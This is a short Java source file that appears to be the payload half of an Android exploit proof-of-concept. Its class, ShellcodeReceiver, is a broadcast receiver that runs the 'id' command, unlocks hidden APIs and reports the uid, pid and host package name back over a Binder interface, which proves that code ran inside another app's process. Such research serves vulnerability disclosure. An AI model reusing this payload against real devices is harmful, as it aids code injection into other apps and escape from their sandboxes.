package com.example.leakvalue;

import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Process;
import android.os.RemoteException;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ShellcodeReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Shellcode", "Shellcode has been executed in uid=" + Process.myUid() + " pid=" + Process.myPid());
        MiscUtils.allowHiddenApis();
        IShellcodeReporter reporter = IShellcodeReporter.Stub.asInterface(intent.getExtras().getBinder("a"));
        try {
            reporter.noteShellcodeExecuted(getPackageName(), getId());
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    static String getId() {
        try {
            return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            return "uid=" + Process.myUid() + ". Execution of id command failed";
        }
    }

    static String getPackageName() {
        try {
            Application application = (Application) Class.forName("android.app.ActivityThread")
                    .getMethod("currentApplication")
                    .invoke(null);
            return application.getPackageName();
        } catch (Exception e) {
            return "?";
        }
    }
}
